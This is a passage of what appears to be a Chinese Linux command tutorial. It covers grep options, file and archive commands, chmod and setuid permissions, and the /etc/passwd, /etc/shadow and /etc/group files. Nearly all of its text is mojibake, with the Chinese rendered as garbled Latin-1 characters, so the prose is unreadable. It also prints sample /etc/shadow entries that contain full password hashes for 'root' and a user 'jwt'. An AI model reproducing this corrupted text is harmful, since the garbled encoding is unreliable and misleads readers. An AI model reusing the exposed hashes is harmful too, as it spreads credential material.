·å¼çš„é‚£ä¸€è¡Œä¹‹å¤–ï¼Œå¹¶æ˜¾ç¤ºè¯¥è¡Œä¹‹åçš„å†…å®¹ã€‚\n-b åœ¨æ˜¾ç¤ºç¬¦åˆèŒƒæœ¬æ ·å¼çš„é‚£ä¸€è¡Œä¹‹å¤–ï¼Œå¹¶æ˜¾ç¤ºè¯¥è¡Œä¹‹å‰çš„å†…å®¹ã€‚\n-c è®¡ç®—ç¬¦åˆèŒƒæœ¬æ ·å¼çš„åˆ—æ•°ã€‚\n-C<æ˜¾ç¤ºåˆ—æ•°>æˆ–-<æ˜¾ç¤ºåˆ—æ•°>  é™¤äº†æ˜¾ç¤ºç¬¦åˆèŒƒæœ¬æ ·å¼çš„é‚£ä¸€åˆ—ä¹‹å¤–ï¼Œå¹¶æ˜¾ç¤ºè¯¥åˆ—ä¹‹å‰åçš„å†…å®¹ã€‚\n-d<è¿›è¡ŒåŠ¨ä½œ> å½“æŒ‡å®šè¦æŸ¥æ‰¾çš„æ˜¯ç›®å½•è€Œéæ–‡ä»¶æ—¶ï¼Œå¿…é¡»ä½¿ç”¨è¿™é¡¹å‚æ•°ï¼Œå¦åˆ™grepå‘½ä»¤å°†å›æŠ¥ä¿¡æ¯å¹¶åœæ­¢åŠ¨ä½œã€‚\n-e<èŒƒæœ¬æ ·å¼> æŒ‡å®šå­—ç¬¦ä¸²ä½œä¸ºæŸ¥æ‰¾æ–‡ä»¶å†…å®¹çš„èŒƒæœ¬æ ·å¼ã€‚\n-E å°†èŒƒæœ¬æ ·å¼ä¸ºå»¶ä¼¸çš„æ™®é€šè¡¨ç¤ºæ³•æ¥ä½¿ç”¨ï¼Œæ„å‘³ç€ä½¿ç”¨èƒ½ä½¿ç”¨æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼ã€‚\n-f<èŒƒæœ¬æ–‡ä»¶> æŒ‡å®šèŒƒæœ¬æ–‡ä»¶ï¼Œå…¶å†…å®¹æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªèŒƒæœ¬æ ·å¼ï¼Œè®©grepæŸ¥æ‰¾ç¬¦åˆèŒƒæœ¬æ¡ä»¶çš„æ–‡ä»¶å†…å®¹ï¼Œæ ¼å¼ä¸ºæ¯ä¸€åˆ—çš„èŒƒæœ¬æ ·å¼ã€‚\n-F å°†èŒƒæœ¬æ ·å¼è§†ä¸ºå›ºå®šå­—ç¬¦ä¸²çš„åˆ—è¡¨ã€‚\n-G å°†èŒƒæœ¬æ ·å¼è§†ä¸ºæ™®é€šçš„è¡¨ç¤ºæ³•æ¥ä½¿ç”¨ã€‚\n-h åœ¨æ˜¾ç¤ºç¬¦åˆèŒƒæœ¬æ ·å¼çš„é‚£ä¸€åˆ—ä¹‹å‰ï¼Œä¸æ ‡ç¤ºè¯¥åˆ—æ‰€å±çš„æ–‡ä»¶åç§°ã€‚\n-H åœ¨æ˜¾ç¤ºç¬¦åˆèŒƒæœ¬æ ·å¼çš„é‚£ä¸€åˆ—ä¹‹å‰ï¼Œæ ‡ç¤ºè¯¥åˆ—çš„æ–‡ä»¶åç§°ã€‚\n-i å¿½ç•¥å­—ç¬¦å¤§å°å†™çš„å·®åˆ«ã€‚\n-l åˆ—å‡ºæ–‡ä»¶å†…å®¹ç¬¦åˆæŒ‡å®šçš„èŒƒæœ¬æ ·å¼çš„æ–‡ä»¶åç§°ã€‚\n-L åˆ—å‡ºæ–‡ä»¶å†…å®¹ä¸ç¬¦åˆæŒ‡å®šçš„èŒƒæœ¬æ ·å¼çš„æ–‡ä»¶åç§°ã€‚\n-n åœ¨æ˜¾ç¤ºç¬¦åˆèŒƒæœ¬æ ·å¼çš„é‚£ä¸€åˆ—ä¹‹å‰ï¼Œæ ‡ç¤ºå‡ºè¯¥åˆ—çš„ç¼–å·ã€‚\n-q ä¸æ˜¾ç¤ºä»»ä½•ä¿¡æ¯ã€‚\n-R/-r æ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®šâ€œ-d recurseâ€å‚æ•°ç›¸åŒã€‚\n-s ä¸æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ã€‚\n-v åè½¬æŸ¥æ‰¾ã€‚\n-w åªæ˜¾ç¤ºå…¨å­—ç¬¦åˆçš„åˆ—ã€‚\n-x åªæ˜¾ç¤ºå…¨åˆ—ç¬¦åˆçš„åˆ—ã€‚\n-y æ­¤å‚æ•°æ•ˆæœè·Ÿâ€œ-iâ€ç›¸åŒã€‚\n-o åªè¾“å‡ºæ–‡ä»¶ä¸­åŒ¹é…åˆ°çš„éƒ¨åˆ†ã€‚\n```\n\n```bash\n#æŸ¥è¯¢cpuinfoä¿¡æ¯åˆå¹¶è¾“å…¥ä¸€æ¡\ngrep name /proc/cpuinfo | uniq     uniq:åˆå¹¶\n\n#æŸ¥è¯¢cpuinfoä¿¡æ¯åˆå¹¶è¾“å…¥ä¸€æ¡å¹¶åªè¾“å‡º:åçš„\ncat /proc/cpuinfo | grep name |cut -f2 -d \":\" |uniq\n# -f2 æ˜¾ç¤ºç¬¬äºŒåˆ—çš„å†…å®¹ï¼›-d \":\" ä»¥:ä¸ºåˆ†éš”ç¬¦\n\n#æŸ¥è¯¢cpuinfoä¿¡æ¯åˆå¹¶è¾“å…¥ç¬¬3åˆ—\ncat /proc/cpuinfo |grep name | awk '{print $3}'\n\ncat /proc/meminfo |grep MemTotal | awk '{print $2/1024}'\n```\n\n### æ–‡ä»¶çš„æ“ä½œå‘½ä»¤ï¼ˆå¢åˆ æ”¹æŸ¥ï¼‰\n\n```bash\n1 touch æ–‡ä»¶åç§°: æ–‡ä»¶çš„åˆ›å»ºï¼ˆå¢ï¼‰\n\n2 cat/more/less/tailæ–‡ä»¶åç§°  æ–‡ä»¶çš„æŸ¥çœ‹ï¼ˆæŸ¥ï¼‰\n\n   catï¼šåªèƒ½æ˜¾ç¤ºæœ€åä¸€å±å†…å®¹\n\n moreï¼šå¯ä»¥æ˜¾ç¤ºç™¾åˆ†æ¯”ï¼Œå›è½¦å¯ä»¥å‘ä¸‹ä¸€è¡Œï¼Œ ç©ºæ ¼å¯ä»¥å‘ä¸‹ä¸€é¡µï¼Œqå¯ä»¥é€€å‡ºæŸ¥çœ‹\n\n lessï¼šå¯ä»¥ä½¿ç”¨é”®ç›˜ä¸Šçš„PgUpå’ŒPgDnå‘ä¸Š å’Œå‘ä¸‹ç¿»é¡µï¼Œqç»“æŸæŸ¥çœ‹\n\n tail-10 ï¼šæŸ¥çœ‹æ–‡ä»¶çš„å10è¡Œï¼ŒCtrl+Cç»“æŸ\n\næ³¨æ„ï¼šå‘½ä»¤ tail -f æ–‡ä»¶ å¯ä»¥å¯¹æŸä¸ªæ–‡ä»¶è¿›è¡ŒåŠ¨æ€ç›‘æ§ï¼Œä¾‹å¦‚tomcatçš„æ—¥å¿—æ–‡ä»¶ï¼Œ ä¼šéšç€ç¨‹åºçš„è¿è¡Œï¼Œæ—¥å¿—ä¼šå˜åŒ–ï¼Œå¯ä»¥ä½¿ç”¨tail -f catalina-2016-11-11.log ç›‘æ§ æ–‡ ä»¶çš„å˜åŒ–\n\n3 vim æ–‡ä»¶ï¼šä¿®æ”¹æ–‡ä»¶çš„å†…å®¹ï¼ˆæ”¹ï¼‰\n\nvimç¼–è¾‘å™¨æ˜¯Linuxä¸­çš„å¼ºå¤§ç»„ä»¶ï¼Œæ˜¯viç¼–è¾‘å™¨çš„åŠ å¼ºç‰ˆï¼Œvimç¼–è¾‘å™¨çš„å‘½ä»¤å’Œå¿«æ·æ–¹å¼æœ‰å¾ˆå¤šï¼Œä½†æ­¤å¤„ä¸ä¸€ä¸€é˜è¿°ï¼Œå¤§å®¶ä¹Ÿæ— éœ€ç ”ç©¶çš„å¾ˆé€å½»ï¼Œä½¿ç”¨vimç¼–è¾‘ä¿®æ”¹æ–‡ä»¶çš„æ–¹å¼åŸºæœ¬ä¼šä½¿ç”¨å°±å¯ä»¥äº†ã€‚ \n\nåœ¨å®é™…å¼€å‘ä¸­ï¼Œä½¿ç”¨vimç¼–è¾‘å™¨ä¸»è¦ä½œç”¨å°±æ˜¯ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œä¸‹é¢æ˜¯ä¸€èˆ¬æ­¥éª¤ï¼š \n\nvim æ–‡ä»¶------>è¿›å…¥æ–‡ä»¶----->å‘½ä»¤æ¨¡å¼------>æŒ‰iè¿›å…¥ç¼–è¾‘æ¨¡å¼----->ç¼–è¾‘æ–‡ä»¶ ------->æŒ‰Escè¿›å…¥åº•è¡Œæ¨¡å¼----->è¾“å…¥:wq/q! ï¼ˆè¾“å…¥wqä»£è¡¨å†™å…¥å†…å®¹å¹¶é€€å‡ºï¼Œå³ä¿å­˜ï¼›è¾“å…¥q!ä»£è¡¨å¼ºåˆ¶é€€å‡ºä¸ä¿å­˜ã€‚ï¼‰\n\n4 rm -rf æ–‡ä»¶ï¼šåˆ é™¤æ–‡ä»¶ï¼ˆåˆ ï¼‰åŒç›®å½•åˆ é™¤ï¼šç†Ÿè®° rm -rfæ–‡ä»¶ å³å¯\n    -p é€’å½’åˆ é™¤ç©ºç›®å½• -f å¼ºåˆ¶åˆ é™¤ -r é€’å½’ -i è¯¢é—®\n\n```\n### å‹ç¼©æ–‡ä»¶çš„æ“ä½œå‘½ä»¤\n\n```bash\n1ï¼‰æ‰“åŒ…å¹¶å‹ç¼©æ–‡ä»¶ï¼š\n\nLinuxä¸­çš„æ‰“åŒ…æ–‡ä»¶ä¸€èˆ¬æ˜¯ä»¥.tarç»“å°¾çš„ï¼Œå‹ç¼©çš„å‘½ä»¤ä¸€èˆ¬æ˜¯ä»¥.gzç»“å°¾çš„ã€‚\n\nè€Œä¸€èˆ¬æƒ…å†µä¸‹æ‰“åŒ…å’Œå‹ç¼©æ˜¯ä¸€èµ·è¿›è¡Œçš„ï¼Œæ‰“åŒ…å¹¶å‹ç¼©åçš„æ–‡ä»¶çš„åç¼€åä¸€èˆ¬.tar.gzã€‚å‘½ä»¤ï¼štar -zcvf æ‰“åŒ…å‹ç¼©åçš„æ–‡ä»¶å è¦æ‰“åŒ…å‹ç¼©çš„æ–‡ä»¶,å…¶ä¸­ï¼š\n\nzï¼šè°ƒç”¨gzipå‹ç¼©å‘½ä»¤è¿›è¡Œå‹ç¼©\n\ncï¼šæ‰“åŒ…æ–‡ä»¶\n\nvï¼šæ˜¾ç¤ºè¿è¡Œè¿‡ç¨‹\n\nfï¼šæŒ‡å®šæ–‡ä»¶å\n\næ¯”å¦‚ï¼šåŠ å…¥testç›®å½•ä¸‹æœ‰ä¸‰ä¸ªæ–‡ä»¶åˆ†åˆ«æ˜¯ :aaa.txt bbb.txt ccc.txt,å¦‚æœæˆ‘ä»¬è¦æ‰“åŒ…testç›®å½•å¹¶æŒ‡å®šå‹ç¼©åçš„å‹ç¼©åŒ…åç§°ä¸ºtest.tar.gzå¯ä»¥ä½¿ç”¨å‘½ä»¤ï¼štar -zcvf test.tar.gz aaa.txt bbb.txt ccc.txtæˆ–ï¼štar -zcvf test.tar.gz /test/\n\n2ï¼‰è§£å‹å‹ç¼©åŒ…ï¼š\n\nå‘½ä»¤ï¼štar [-xvf] å‹ç¼©æ–‡ä»¶\n\nå…¶ä¸­ï¼šxï¼šä»£è¡¨è§£å‹\n\nç¤ºä¾‹ï¼š\n\n1 å°†/testä¸‹çš„test.tar.gzè§£å‹åˆ°å½“å‰ç›®å½•ä¸‹å¯ä»¥ä½¿ç”¨å‘½ä»¤ï¼štar -xvf test.tar.gz\n\n2 å°†/testä¸‹çš„test.tar.gzè§£å‹åˆ°æ ¹ç›®å½•/usrä¸‹:tar -xvf xxx.tar.gz -C /usr(-Cä»£è¡¨æŒ‡å®šè§£å‹çš„ä½ç½®ï¼‰\n```\n\n## æ–‡ä»¶æƒé™å‘½ä»¤\n\næ“ä½œç³»ç»Ÿä¸­æ¯ä¸ªæ–‡ä»¶éƒ½æ‹¥æœ‰ç‰¹å®šçš„æƒé™ã€æ‰€å±ç”¨æˆ·å’Œæ‰€å±ç»„ã€‚æƒé™æ˜¯æ“ä½œç³»ç»Ÿç”¨æ¥é™åˆ¶èµ„æºè®¿é—®çš„æœºåˆ¶ï¼Œåœ¨Linuxä¸­æƒé™ä¸€èˆ¬åˆ†ä¸ºè¯»(readable)ã€å†™(writable)å’Œæ‰§è¡Œ(excutable)ï¼Œåˆ†ä¸ºä¸‰ç»„ã€‚åˆ†åˆ«å¯¹åº”æ–‡ä»¶çš„å±ä¸»(owner)ï¼Œå±ç»„(group)å’Œå…¶ä»–ç”¨æˆ·(other)ï¼Œé€šè¿‡è¿™æ ·çš„æœºåˆ¶æ¥é™åˆ¶å“ªäº›ç”¨æˆ·ã€å“ªäº›ç»„å¯ä»¥å¯¹ç‰¹å®šçš„æ–‡ä»¶è¿›è¡Œä»€ä¹ˆæ ·çš„æ“ä½œã€‚é€šè¿‡ Â·ls -lÂ· å‘½ä»¤æˆ‘ä»¬å¯ä»¥ æŸ¥çœ‹æŸä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶æˆ–ç›®å½•çš„æƒé™\n\nç¤ºä¾‹ï¼šåœ¨éšæ„æŸä¸ªç›®å½•ä¸‹ls -l\n![](https://i.loli.net/2019/07/26/5d3ac443b1b1f34567.png)\nç¬¬ä¸€åˆ—çš„å†…å®¹çš„è§£é‡Šä¿¡æ¯å¦‚ä¸‹ï¼š\n![](https://i.loli.net/2019/07/26/5d3ac4062d35135223.png)\n\nä¸‹é¢å°†è¯¦ç»†è®²è§£æ–‡ä»¶çš„ç±»å‹ã€Linuxä¸­æƒé™ä»¥åŠæ–‡ä»¶æœ‰æ‰€æœ‰è€…ã€æ‰€åœ¨ç»„ã€å…¶å®ƒç»„å…·ä½“æ˜¯ä»€ä¹ˆï¼Ÿ\n\n**æ–‡ä»¶çš„ç±»å‹**ï¼š\n\n```bash\nâ€¢dï¼šä»£è¡¨ç›®å½•\nâ€¢-ï¼šä»£è¡¨æ–‡ä»¶\nâ€¢lï¼šä»£è¡¨é“¾æ¥ï¼ˆå¯ä»¥è®¤ä¸ºæ˜¯windowä¸­çš„å¿«æ·æ–¹å¼ï¼‰\n```\n**Linuxä¸­æƒé™åˆ†ä¸ºä»¥ä¸‹å‡ ç§**ï¼š\n\n```bash\nâ€¢rï¼šä»£è¡¨æƒé™æ˜¯å¯è¯»ï¼Œrä¹Ÿå¯ä»¥ç”¨æ•°å­—4è¡¨ç¤º\nâ€¢wï¼šä»£è¡¨æƒé™æ˜¯å¯å†™ï¼Œwä¹Ÿå¯ä»¥ç”¨æ•°å­—2è¡¨ç¤º\nâ€¢xï¼šä»£è¡¨æƒé™æ˜¯å¯æ‰§è¡Œï¼Œxä¹Ÿå¯ä»¥ç”¨æ•°å­—1è¡¨ç¤º\n```\n**æ–‡ä»¶å’Œç›®å½•æƒé™çš„åŒºåˆ«**ï¼š\n\nå¯¹æ–‡ä»¶å’Œç›®å½•è€Œè¨€ï¼Œè¯»å†™æ‰§è¡Œè¡¨ç¤ºä¸åŒçš„æ„ä¹‰ã€‚\n\nå¯¹äºæ–‡ä»¶ï¼š\n![](https://i.loli.net/2019/07/26/5d3ac5277a41331143.png)\n\nå¯¹äºç›®å½•ï¼š\n![](https://i.loli.net/2019/07/26/5d3ac53f2976858167.png)\n\n\n\n>åœ¨linuxä¸­çš„æ¯ä¸ªç”¨æˆ·å¿…é¡»å±äºä¸€ä¸ªç»„ï¼Œä¸èƒ½ç‹¬ç«‹äºç»„å¤–ã€‚åœ¨linuxä¸­æ¯ä¸ªæ–‡ä»¶æœ‰æ‰€æœ‰è€…ã€æ‰€åœ¨ç»„ã€å…¶å®ƒç»„çš„æ¦‚å¿µã€‚\n\n* æ‰€æœ‰è€…\n\nä¸€èˆ¬ä¸ºæ–‡ä»¶çš„åˆ›å»ºè€…ï¼Œè°åˆ›å»ºäº†è¯¥æ–‡ä»¶ï¼Œå°±å¤©ç„¶çš„æˆä¸ºè¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…ï¼Œç”¨ls â€ahlå‘½ä»¤å¯ä»¥çœ‹åˆ°æ–‡ä»¶çš„æ‰€æœ‰è€… ä¹Ÿå¯ä»¥ä½¿ç”¨chown ç”¨æˆ·å æ–‡ä»¶åæ¥ä¿®æ”¹æ–‡ä»¶çš„æ‰€æœ‰è€… ã€‚\n\n* æ–‡ä»¶æ‰€åœ¨ç»„\n\nå½“æŸä¸ªç”¨æˆ·åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶åï¼Œè¿™ä¸ªæ–‡ä»¶çš„æ‰€åœ¨ç»„å°±æ˜¯è¯¥ç”¨æˆ·æ‰€åœ¨çš„ç»„ ç”¨ls â€ahlå‘½ä»¤å¯ä»¥çœ‹åˆ°æ–‡ä»¶çš„æ‰€æœ‰ç»„ ä¹Ÿå¯ä»¥ä½¿ç”¨chgrp ç»„å æ–‡ä»¶åæ¥ä¿®æ”¹æ–‡ä»¶æ‰€åœ¨çš„ç»„ã€‚\n\n* å…¶å®ƒç»„\n\né™¤å¼€æ–‡ä»¶çš„æ‰€æœ‰è€…å’Œæ‰€åœ¨ç»„çš„ç”¨æˆ·å¤–ï¼Œç³»ç»Ÿçš„å…¶å®ƒç”¨æˆ·éƒ½æ˜¯æ–‡ä»¶çš„å…¶å®ƒç»„\n\n**å¦‚ä½•ä¿®æ”¹æ–‡ä»¶/ç›®å½•çš„æƒé™**\n\nä¿®æ”¹æ–‡ä»¶/ç›®å½•çš„æƒé™çš„å‘½ä»¤ï¼šchmod\næ ¼å¼ï¼š[ugoa...][[+-=][rwxX]...][,...]\n\n```bash\nuè¡¨ç¤ºæ‹¥æœ‰è€…ï¼ˆuserï¼‰\ngè¡¨ç¤ºä¸æ‹¥æœ‰è€…å±äºåŒç»„groupï¼‰\noè¡¨ç¤ºå…¶å®ƒç”¨æˆ·ï¼ˆotherï¼‰\naè¡¨ç¤ºè¿™ä¸‰è€…çš†æ˜¯ã€‚(all)\n```\n```bash\n+è¡¨ç¤ºæ·»åŠ æƒé™ï¼Œ-è¡¨ç¤ºå–æ¶ˆæƒé™ã€‚=è¡¨ç¤ºå”¯ä¸€è®¾å®šæƒé™ã€‚\n\nrï¼šè¡¨ç¤ºå¯è¯»å–ï¼Œwè¡¨ç¤ºå¯å†™å…¥ï¼Œxè¡¨ç¤ºå¯è¿è¡Œã€‚\n```\nç¤ºä¾‹ï¼šä¿®æ”¹/testä¸‹çš„aaa.txtçš„æƒé™ä¸ºå±ä¸»æœ‰å…¨éƒ¨æƒé™ï¼Œå±ä¸»æ‰€åœ¨çš„ç»„æœ‰è¯»å†™æƒé™ï¼Œ å…¶ä»–ç”¨æˆ·åªæœ‰è¯»çš„æƒé™\n\n```chmod u=rwx,g=rw,o=r aaa.txt```\n![](https://i.loli.net/2019/07/26/5d3ac6193b4d871854.png)\nä¸Šè¿°ç¤ºä¾‹è¿˜å¯ä»¥ä½¿ç”¨æ•°å­—è¡¨ç¤ºï¼š\n\n```chmod 764 aaa.txt```\n**ä½¿ç”¨æ•°å­—è®¾ç½®æƒé™**ï¼š\nè¯­æ³•ï¼šchmod abc file\n\nå½“ä¸­a,b,cå„ä¸ºä¸€ä¸ªæ•°å­—ï¼Œaè¡¨ç¤ºUserï¼Œbè¡¨ç¤ºGroupã€‚cè¡¨ç¤ºOtherçš„æƒé™ã€‚\n```bash\nr=4ï¼Œw=2ã€‚x=1\n\nè‹¥è¦rwxï¼ˆå¯è¯»ã€å¯å†™ã€å¯è¿è¡Œï¼‰å±æ€§ï¼Œåˆ™4+2+1=7\n\nè‹¥è¦rw-ï¼ˆå¯è¯»ã€å¯å†™ã€ä¸å¯è¿è¡Œï¼‰å±æ€§ï¼Œåˆ™4+2=6\n\nè‹¥è¦r-wï¼ˆå¯è¯»ã€ä¸å¯å†™ã€å¯è¿è¡Œï¼‰å±æ€§ï¼Œåˆ™4+1=5\n```\nç¤ºä¾‹ï¼š\n```bash\nchmod a=rwx file å’Œ chmod 777 file æ•ˆæœåŒæ ·\n\nchmod ug=rwx,o=x file å’Œ chmod 771 file æ•ˆæœåŒæ ·\n\nè‹¥ç”¨chmod 4755 filenameå¯ä½¿æ­¤ç¨‹å¼å…·æœ‰rootçš„æƒé™\n```\n**æ³¨æ„ï¼šæ–‡ä»¶å¤¹è¦æœ‰xæƒé™æ‰å¯ä»¥è®¿é—®ï¼Œåªæœ‰rä¸å¯ä»¥è®¿é—®**\n\n**è¡¥å……ä¸€ä¸ªæ¯”è¾ƒå¸¸ç”¨çš„ä¸œè¥¿**:\n\nå‡å¦‚æˆ‘ä»¬è£…äº†ä¸€ä¸ªzookeeperï¼Œæˆ‘ä»¬æ¯æ¬¡å¼€æœºåˆ°è¦æ±‚å…¶è‡ªåŠ¨å¯åŠ¨è¯¥æ€ä¹ˆåŠï¼Ÿ\n\n1.æ–°å»ºä¸€ä¸ªè„šæœ¬zookeeper\n2.ä¸ºæ–°å»ºçš„è„šæœ¬zookeeperæ·»åŠ å¯æ‰§è¡Œæƒé™ï¼Œå‘½ä»¤æ˜¯:chmod +x zookeeper\n3.æŠŠzookeeperè¿™ä¸ªè„šæœ¬æ·»åŠ åˆ°å¼€æœºå¯åŠ¨é¡¹é‡Œé¢ï¼Œå‘½ä»¤æ˜¯ï¼šchkconfig --add zookeeper\n4.å¦‚æœæƒ³çœ‹çœ‹æ˜¯å¦æ·»åŠ æˆåŠŸï¼Œå‘½ä»¤æ˜¯ï¼šchkconfig --list\n\n## ç”¨æˆ·ç®¡ç†\n\nLinuxç³»ç»Ÿæ˜¯ä¸€ä¸ªå¤šç”¨æˆ·å¤šä»»åŠ¡çš„åˆ†æ—¶æ“ä½œç³»ç»Ÿï¼Œä»»ä½•ä¸€ä¸ªè¦ä½¿ç”¨ç³»ç»Ÿèµ„æºçš„ç”¨æˆ·ï¼Œéƒ½å¿…é¡»é¦–å…ˆå‘ç³»ç»Ÿç®¡ç†å‘˜ç”³è¯·ä¸€ä¸ªè´¦å·ï¼Œç„¶åä»¥è¿™ä¸ªè´¦å·çš„èº«ä»½è¿›å…¥ç³»ç»Ÿã€‚\n\nç”¨æˆ·çš„è´¦å·ä¸€æ–¹é¢å¯ä»¥å¸®åŠ©ç³»ç»Ÿç®¡ç†å‘˜å¯¹ä½¿ç”¨ç³»ç»Ÿçš„ç”¨æˆ·è¿›è¡Œè·Ÿè¸ªï¼Œå¹¶æ§åˆ¶ä»–ä»¬å¯¹ç³»ç»Ÿèµ„æºçš„è®¿é—®ï¼›å¦ä¸€æ–¹é¢ä¹Ÿå¯ä»¥å¸®åŠ©ç”¨æˆ·ç»„ç»‡æ–‡ä»¶ï¼Œå¹¶ä¸ºç”¨æˆ·æä¾›å®‰å…¨æ€§ä¿æŠ¤ã€‚\n\n#### ç”¨æˆ·ç®¡ç†çš„å‡ ä¸ªç³»ç»Ÿé…ç½®æ–‡ä»¶\n\n1.   **/etc/passwd**ï¼š**å­˜æ”¾å…³äºè´¦æˆ·ç›¸å…³çš„ä¿¡æ¯**\n\n   ![](https://i.loli.net/2020/03/30/icPxY4WV7d69pjg.png)\n\n2.  **etc/shadowï¼š/etc/passwdçš„å½±å­æ–‡ä»¶**\n\n   ```bash\n   root:$6$/LWuDRno$roPA0L5ZR.gsfLmCWKqNnE2F3oePaaqvHlF2O07oM9tzDzBlyyC62gS6VxKpc/eKGz/UaypXCtfltmQ7d7/7b1:18314:0:99999:7:::\n   ```\n   | **å­—æ®µå**   | **ç¼–å·** | **è¯´æ˜**                                            |\n   | ------------ | -------- | --------------------------------------------------- |\n   | **username** | **1**    | **root**                                            |\n   | **password** | **2**    | **åŠ å¯†å£ä»¤ï¼š$6$/LWuDRno$roPA0L5ZR.gs.../7b1**       |\n   | **lastchg**  | **3**    | **è‡ª1970.1.1èµ·åˆ°ä¸Šæ¬¡ä¿®æ”¹å£ä»¤æ‰€ç»è¿‡çš„å¤©æ•°ï¼š17431å¤©** |\n   | **min**      | **4**    | **éœ€å‡ å¤©å¯ä»¥ä¿®æ”¹å£ä»¤ï¼š0å¤©**                         |\n   | **max**      | **5**    | **å£ä»¤è¿˜ä¼šæœ‰æ•ˆçš„æœ€å¤§å¤©æ•°ï¼š99999å¤©ï¼Œå³æ°¸ä¸è¿‡æœŸ**     |\n   | **warn**     | **6**    | **å£ä»¤å¤±æ•ˆå‰7å¤©å†…å‘ç”¨æˆ·å‘å‡ºè­¦å‘Š**                   |\n   | **inactive** | **7**    | **ç¦æ­¢ç™»å½•å‰ç”¨æˆ·è¿˜æœ‰æ•ˆçš„å¤©æ•°æœªå®šä¹‰ï¼Œä»¥â€œï¼šâ€è¡¨ç¤º**    |\n   | **expire**   | **8**    | **ç”¨æˆ·è¢«ç¦æ­¢ç™»å½•çš„æ—¶é—´æœªå®šä¹‰ï¼Œä»¥â€œï¼šâ€è¡¨ç¤º**          |\n   | **flag**     | **9**    | **ä¿ç•™æœªä½¿ç”¨ï¼Œä»¥â€œï¼šâ€è¡¨ç¤º**                          |\n\n```bash\njwt:$6$VtVD9Veq$B2YcOYK6qE96wiWNMq45N4pGB.3/UdSzTBmdyizB3YADRjbE5HbaBOhw5JxpDWCH.b/Bj3MBQSB8Y8zqLFjef1:18314:0:99999:7:::\n```\n![](https://i.loli.net/2020/03/30/e8WmFto13ATRDpL.png)\n\n| **å­—æ®µå** | **ç¼–å·** | **è¯´æ˜**                                   |\n| ---------- | -------- | ------------------------------------------ |\n| username   | **1**    | **ç”¨æˆ·çš„ç™»å½•å**                           |\n| password   | **2**    | **åŠ å¯†çš„ç”¨æˆ·å¯†ç **                         |\n| lastchg    | **3**    | **è‡ª1970.1.1èµ·åˆ°ä¸Šæ¬¡ä¿®æ”¹å£ä»¤æ‰€ç»è¿‡çš„å¤©æ•°** |\n| min        | **4**    | **ä¸¤æ¬¡ä¿®æ”¹å£ä»¤ä¹‹é—´è‡³å°‘ç»è¿‡çš„å¤©æ•°**         |\n| max        | **5**    | **å£ä»¤è¿˜ä¼šæœ‰æ•ˆçš„æœ€å¤§å¤©æ•°**                 |\n| warn       | **6**    | **å£ä»¤å¤±æ•ˆå‰å¤šå°‘å¤©å†…å‘ç”¨æˆ·å‘å‡ºè­¦å‘Š**       |\n| inactive   | **7**    | **ç¦æ­¢ç™»å½•å‰ç”¨æˆ·è¿˜æœ‰æ•ˆçš„å¤©æ•°**             |\n| expire     | **8**    | **ç”¨æˆ·è¢«ç¦æ­¢ç™»å½•çš„æ—¶é—´**                   |\n| flag       | **9**    | **ä¿ç•™**                                   |\n\n3. **/etc/groupæ–‡ä»¶:å­˜æ”¾ç”¨æˆ·ç»„ç›¸å…³çš„ä¿¡æ¯èµ„æ–™**\n\n```bash\nroot:x:0:\n\njwt:x:1000:\n```\n\n| å­—æ®µå         | ç¼–å·  | è¯´æ˜                   |\n| -------------- | ----- | ---------------------- |\n| group_name     | **1** | **ç”¨æˆ·ç»„å**           |\n| group_password | **2** | **åŠ å¯†åçš„ç”¨æˆ·ç»„å¯†ç ** |\n| group_id       | **3** | **ç”¨æˆ·ç»„ID**           |\n| group_members  | **4** | **é€—å·åˆ†éš”å¼€çš„ç»„æˆå‘˜** |\n\n 4.**etc/gshadow:ä¸ºäº†ä¿æŠ¤ç”¨æˆ·ç»„çš„åŠ å¯†å¯†ç ï¼Œé˜²æ­¢æš´åŠ›ç ´è§£**\n\n```bash\nroot:*::\n\njwt:!::\n```\n\n| å­—æ®µå         | ç¼–å·  | è¯´æ˜                               |\n| -------------- | ----- | ---------------------------------- |\n| group_name     | **1** | **ç”¨æˆ·ç»„å**                       |\n| group_password | **2** | **åŠ å¯†åçš„ç”¨æˆ·ç»„å¯†ç **             |\n| group_id       | **3** | **ç”¨æˆ·ç»„IDï¼ˆå¯ä»¥ä¸ºç©ºï¼‰**           |\n| group_members  | **4** | **é€—å·åˆ†éš”å¼€çš„ç»„æˆå‘˜ï¼ˆå¯ä»¥ä¸ºç©ºï¼‰** |\n\n`ï¼`è¡¨ç¤ºç»„æ²¡æœ‰è®¾ç½®å¯†ç ï¼Œå¯ä»¥ç”¨`gpasswd`å‘½ä»¤ç»™ç»„è®¾ç½®å¯†ç \n\n#### æ·»åŠ ç”¨æˆ·\n\n```bash\nuseradd é€‰é¡¹ ç”¨æˆ·å   #åˆ›å»ºæ–°ç”¨æˆ·\n#æ³¨æ„ï¼šä½¿ç”¨useraddå‘½ä»¤æ·»åŠ ç”¨æˆ·åï¼Œå¦‚æœä¸ä½¿ç”¨passwdå‘½ä»¤ä¸ºç”¨æˆ·è®¾ç½®å¯†ç ï¼Œæ­¤ç”¨æˆ·å°†æ— æ³•ç™»å½•ã€‚\n\nadduser é€‰é¡¹ ç”¨æˆ·å   #æ·»åŠ ç”¨æˆ·\n```\n**useraddå‘½ä»¤å¸¸ç”¨é€‰é¡¹ï¼š**\n\n| **é€‰é¡¹** | **ä½œç”¨**                                                     |\n| -------- | ------------------------------------------------------------ |\n| **-d**   | **æŒ‡å®šç”¨æˆ·ä¸»ç›®å½•ã€‚å¦‚æœæ­¤ç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™åŒæ—¶ä½¿ç”¨-mé€‰é¡¹ï¼Œå¯ä»¥åˆ›å»ºä¸»ç›®å½•ã€‚** |\n| **-g**   | **æŒ‡å®šgid**                                                  |\n| **-u**   | **æŒ‡å®šuid**                                                  |\n| **-G**   | **æŒ‡å®šç”¨æˆ·æ‰€å±çš„é™„åŠ ç»„ã€‚**                                   |\n| **-l**   | **ä¸è¦æŠŠç”¨æˆ·æ·»åŠ åˆ°lastlogå’Œfailogä¸­ï¼Œè¿™ä¸ªç”¨æˆ·çš„ç™»å½•è®°å½•ä¸éœ€è¦è®°è½½** |\n| **-M**   | 